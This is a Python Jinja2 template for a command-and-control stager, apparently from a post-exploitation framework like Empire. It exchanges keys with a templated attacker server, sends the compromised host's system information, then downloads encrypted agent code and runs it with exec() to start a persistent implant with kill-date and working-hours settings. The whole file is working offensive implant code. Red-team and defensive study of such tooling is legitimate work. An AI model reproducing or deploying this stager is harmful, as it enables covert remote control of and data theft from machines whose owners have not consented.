#!/usr/bin/env python3

"""
This file is a Jinja2 template.
    Variables:
        working_hours
        kill_date
        staging_key
        profile
"""

import base64
import random
import string
import time
import urllib.request

{% include 'common/aes.py' %}
{% include 'common/rc4.py' %}
{% include 'common/diffiehellman.py' %}
{% include 'common/get_sysinfo.py' %}
{% include 'smb/comms.py' %}


class Stage:
    def __init__(self):
        self.staging_key = b'{{ staging_key }}'
        self.profile = '{{ profile }}'
        self.server = '{{ host }}'
        self.kill_date = '{{ kill_date }}'
        self.working_hours = '{{ working_hours }}'

        if self.server.startswith("https"):
            hasattr(ssl, '_create_unverified_context') and ssl._create_unverified_context() or None

        self.session_id = b'00000000'
        self.key = None
        self.headers = self.initialize_headers(self.profile)
        self.packet_handler = ExtendedPacketHandler(None, staging_key=self.staging_key, session_id=self.session_id, headers=self.headers, server=self.server, taskURIs=self.taskURIs)

    def initialize_headers(self, profile):
        parts = profile.split('|')
        self.taskURIs = parts[0].split(',')
        userAgent = parts[1]
        headersRaw = parts[2:]
        headers = {'User-Agent': userAgent}
        for headerRaw in headersRaw:
            try:
                headerKey, headerValue = headerRaw.split(":")
                headers[headerKey] = headerValue
            except Exception:
                pass
        return headers

    def execute(self):
        # Diffie-Hellman Key Exchange
        client_pub = DiffieHellman()
        public_key = str(client_pub.publicKey).encode('UTF-8')
        hmac_data = aes_encrypt_then_hmac(self.staging_key, public_key)

        # Build and Send Routing Packet

        routing_packet = self.packet_handler.build_routing_packet(staging_key=self.staging_key, session_id=self.session_id, meta=2, enc_data=hmac_data)
        b64routing_packet = base64.b64encode(routing_packet).decode('UTF-8')
        self.packet_handler.send_queue.Enqueue("2" + b64routing_packet)

        while self.packet_handler.receive_queue.Count == 0:
            time.sleep(1)

        data = self.packet_handler.receive_queue.Peek()
        response = base64.b64decode(data)
        self.packet_handler.receive_queue.Dequeue()

        # Decrypt Server Response
        packet = self.packet_handler.parse_routing_packet(self.staging_key, response)
        self.session_id = list(packet.keys())[0]
        self.packet_handler.session_id = self.session_id
        encdata = packet[self.session_id][3]
        data = aes_decrypt_and_verify(self.staging_key, encdata)
        nonce, server_pub = data[0:16], int(data[16:])

        # Generate Shared Secret
        client_pub.genKey(server_pub)
        self.key = client_pub.key
        self.packet_handler.key = self.key

        # Send System Info
        hmac_data = aes_encrypt_then_hmac(self.key, get_sysinfo(nonce=str(int(nonce) + 1)).encode('UTF-8'))
        routing_packet = self.packet_handler.build_routing_packet(staging_key=self.staging_key, session_id=self.session_id, meta=3, enc_data=hmac_data)

        b64routing_packet = base64.b64encode(routing_packet).decode('UTF-8')
        self.packet_handler.send_queue.Enqueue("2" + b64routing_packet)

        while self.packet_handler.receive_queue.Count == 0:
            time.sleep(1)

        data = self.packet_handler.receive_queue.Peek()
        response = base64.b64decode(data)
        self.packet_handler.receive_queue.Dequeue()

        # Decrypt and Execute Agent
        packet = self.packet_handler.parse_routing_packet(self.staging_key, response)
        agent_code = aes_decrypt_and_verify(self.key, packet[self.session_id][3])
        exec(agent_code, globals())
        agent = MainAgent(packet_handler=self.packet_handler, profile=self.profile, server=self.server, session_id=self.session_id, kill_date=self.kill_date, working_hours=self.working_hours)
        self.packet_handler.agent = agent
        agent.run()

# Initialize and Execute Agent
stage = Stage()
stage.execute()
